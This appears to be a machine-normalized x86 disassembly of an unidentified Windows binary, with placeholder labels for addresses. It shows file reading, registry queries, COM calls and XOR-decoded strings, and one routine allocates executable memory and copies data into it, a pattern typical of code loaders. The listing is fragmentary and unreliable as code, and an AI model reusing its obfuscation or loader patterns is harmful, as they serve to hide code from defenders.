cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100503f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0xa
push eax
call sub_10013bb0
mov ecx [ ebp + 0xc ]
add esp 0x8
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0xa
pop ebp
retn
sub_10050420
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10031020
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10050450
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1002d970
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov ecx [ esi + 0x90 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push ecx
push 0x0
mov [ esi + 0x6c ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ edi + 0x94 ]
mov eax [ edi + 0x90 ]
mov ecx [ esi + 0x90 ]
push edx
push eax
push ecx
call sub_1007f580
mov edx [ edi + 0x94 ]
mov eax [ esi ]
mov [ esi + 0x94 ] edx
mov edx [ eax + 0x8 ]
add esp 0xc
mov ecx esi
call edx
cmp [ edi + 0x98 ] 0x0
je r-xdata
mov eax [ edi + 0x9c ]
mov [ esi + 0x9c ] eax
mov eax [ edi + 0x9c ]
push 0x40
push 0x3000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
mov ecx [ edi + 0x94 ]
mov edx [ edi + 0x98 ]
push ecx
push edx
push eax
call sub_1007f580
add esp 0xc
sub_10050540
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
xor eax eax
mov [ esi + 0xc ] ax
pop esi
retn
mov edx [ esi + 0xc ]
push edx
call sub_1000a86e
add esp 0x4
sub_100505a0
push ebp
mov ebp esp
push ecx
push ebx
push edi
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov [ ebp - 0x4 ] ebx
call [ GetFileSize@IAT ]
mov ecx [ ebp - 0x4 ]
mov esi eax
sub esi ecx
cmp eax 0xffffffff
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
test eax eax
jne r-xdata
cmp ecx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push 0x0
push ecx
push esi
push eax
push edi
call [ ReadFile@IAT ]
cmp eax 0x1
je r-xdata
push edi
lea ebx [ eax + 0x3 ]
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov ebx 0x2
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx 0x4
sub_10050657
push 0x4c
mov eax sub_10085809
call sub_10047689
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_100262c3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000985a
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10025720
push eax
lea ecx [ ebp - 0x58 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10050730
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0x108 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x104 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffbf
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xfc ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xfc ]
jns r-xdata
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0xf0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x130
call sub_1002f620
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x5e
call sub_1002f620
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x38 ]
mov eax 0x101
call sub_1002f620
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x76
jmp r-xdata
call sub_1002f620
lea edx [ ebp - 0x4c ]
mov eax 0xab
call sub_1002f620
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x118
jmp r-xdata
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xf0 ] 0x0
lea edx [ ebp - 0x60 ]
mov eax 0x7e
call sub_1002f620
mov esi [ edi + 0x1c ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xb5
jmp r-xdata
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x100 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x100 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x100 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x110
jmp r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x2c
call sub_1002f620
mov esi [ ebp - 0x100 ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x100 ] eax
mov edx [ edi + 0x14 ]
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xf8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf8 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x45
call sub_1002f620
lea edx [ ebp - 0x14 ]
mov eax 0xc5
call sub_1002f620
mov esi [ ebp - 0xf8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10007950
mov eax [ edi + 0x18 ]
lea edx [ ebp - 0xf4 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xf4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf4 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf8 ] eax
lea edx [ ebp - 0xd8 ]
mov eax 0x7a
call sub_1002f620
mov esi [ ebp - 0xf4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10007950
mov eax [ ebp - 0x108 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x104 ]
push edx
mov edx [ ebp - 0xfc ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x104 ]
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf4 ] eax
lea edx [ ebp - 0xb8 ]
mov eax 0xd8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x104 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
je r-xdata
sub_10050ad0
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_1005fbf0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
mov [ ebp - 0x7c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x80 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x8c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x6d
call sub_1002f620
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea esi [ ebp - 0x84 ]
push esi
mov [ ebp - 0x84 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov edi [ ebp - 0x84 ]
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x24
lea ecx [ ebp - 0x88 ]
push ecx
mov [ ebp - 0x88 ] ebx
call sub_10007d60
mov esi [ ebp - 0x88 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
inc ecx
mov [ ebp - 0x8c ] ecx
cmp ecx [ ebp - 0x80 ]
jl r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x90 ]
push esi
add eax 0x12c
call sub_10014ad0
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax ebx
je r-xdata
mov eax esi
call sub_10054bf0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x107
jmp r-xdata
call sub_10025990
call sub_1002f620
sub_10050c60
push ebp
mov ebp esp
push ecx
push edi
lea edi [ ebp - 0x4 ]
mov edx esi
mov ecx ebx
call sub_10072720
pop edi
test eax eax
js r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push eax
mov eax esi
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
sub_10050cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089fcb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push eax
mov [ ebp - 0x98 ] ecx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0x8c ] esi
cmp esi 0xffffffff
jne r-xdata
push ebx
push esi
call [ GetFileSize@IAT ]
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax 0xaaaaaaab
mul ecx
push ebx
shr edx 0x1
push ebx
add edx edx
push ebx
add edx edx
push esi
mov [ ebp - 0xa8 ] edx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
lea esp [ esp ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x3
jmp r-xdata
mov edi [ ebp - 0x98 ]
call sub_10023140
mov [ ebp - 0xb0 ] eax
cmp eax ebx
je r-xdata
inc ecx
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x43
jmp r-xdata
mov edx eax
call sub_1006efb0
test al 0x3
je r-xdata
shr eax 0x2
lea edi [ eax + eax * 2 ]
mov [ ebp - 0xac ] edi
lea esp [ esp ]
lea ecx [ ebp - 0x90 ]
push ecx
call sub_10026420
add esp 0x4
cmp [ ebp - 0x90 ] ebx
je r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
lea ebx [ ebx ]
dec eax
test al 0x3
jne r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push edi
call [ CloseHandle@IAT ]
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x9c ]
cmp eax ebx
je r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x4
lea ecx [ ebp - 0x90 ]
lea esi [ ebp - 0x88 ]
call sub_100662b0
add esp 0x4
mov ecx [ ebp - 0x98 ]
mov edi [ ebp - 0xb0 ]
add ecx 0xa0
push ecx
mov ecx eax
mov edx edi
mov [ ebp - 0x4 ] ebx
call sub_1006f6e0
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003250
cmp esi 0x42
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x8c ]
push ebx
push ebx
push ebx
mov [ edi + 0xd4 ] bl
push edx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call [ SetFilePointer@IAT ]
mov esi [ ebp - 0x8c ]
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x43
jne r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push edi
call [ CloseHandle@IAT ]
mov eax 0x5
jmp r-xdata
push esi
lea edx [ ebp - 0xa0 ]
lea ecx [ ebp - 0xa4 ]
mov ebx eax
call sub_1002b500
test eax eax
jne r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x57
call sub_10071e30
mov eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x50 ]
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x50 ]
call sub_100702e0
mov edx [ ebp - 0x8c ]
push edx
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0xa4 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
mov edi [ HeapFree@IAT ]
push eax
call edi
mov ebx [ ebp - 0x94 ]
mov ecx [ ebp - 0x9c ]
mov edx [ ebp - 0x98 ]
push ebx
push ecx
mov ecx [ ebp - 0x90 ]
push esi
push edx
mov edx [ ebp - 0xa8 ]
call sub_10003660
test eax eax
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x8c ]
push eax
call [ CloseHandle@IAT ]
mov eax 0x6
add ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xac ]
mov [ ebp - 0x94 ] ebx
xor ebx ebx
jmp r-xdata
push ebx
lea edx [ ebp - 0x9c ]
push edx
push edi
mov edi [ ebp - 0x8c ]
push esi
push edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xa4 ] ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub_10051060
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100510c0
push ebp
mov ebp esp
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2c
and edx 0xff
mov [ ebp + eax * 2 - 0xac ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x54 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x76
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x2b8 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xac ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push edi
lea eax [ ebp - 0x2bc ]
push eax
mov eax [ ebp - 0x2b8 ]
lea ecx [ ebp - 0x2b4 ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ ebp - 0x2bc ] 0x208
call [ RegQueryValueExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call [ RegCloseKey@IAT ]
test edi edi
pop edi
je r-xdata
mov edi 0x2
lea edx [ ebp - 0x50 ]
mov eax 0x19
call sub_10019570
mov edx [ esi + 0xd54 ]
movzx eax [ esi + 0x11a ]
movzx ecx [ esi + 0x118 ]
neg edx
sbb edx edx
and edx 0x20
add edx 0x20
push edx
mov edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
lea eax [ ebp - 0x50 ]
push eax
mov ecx 0x104
call sub_1006d3c0
xor ecx ecx
add esp 0x20
test eax eax
setns cl
pop ebx
lea eax [ ecx - 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
and eax 0x2
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10051220
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10051270
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_10067a9a
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_100512c4
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_10051380
cmp [ esi + 0x6c ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x68 ] edi
mov [ esi + 0x58 ] cx
cmp [ esi + 0x50 ] 0x8
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x4c ] edi
mov [ esi + 0x3c ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x3c ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10051410
mov eax [ esi + 0x1c ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x20 ]
call sub_1006a100
mov eax [ esi + 0x1c ]
push eax
call sub_1000a86e
add esp 0x4
pop edi
push esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_1000a86e
add esp 0x4
mov eax esi
pop ebx
retn
push eax
call sub_1000a86e
add esp 0x4
sub_10051470
push ebp
mov ebp esp
push 0xffffffff
push sub_10087e61
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_1000c610
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
xor ebx ebx
mov ecx [ edi ]
xor ebx ebx
cmp ecx ebx
je r-xdata
xor ecx ecx
mov [ esi + 0x44 ] 0x7
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] cx
mov edi [ esi + 0x18 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebx [ esi + 0x1c ]
cmp edi ebx
je r-xdata
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ esi + 0x18 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x44 ] 0x8
jb r-xdata
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
add edi 0x24
cmp edi ebx
jne r-xdata
mov edx [ edi ]
push edx
call sub_1000a86e
add esp 0x4
sub_10051570
push ebp
mov ebp esp
sub esp 0xf0c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0xf08 ] edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0xc4 ]
mov eax 0x5
call sub_10038bb0
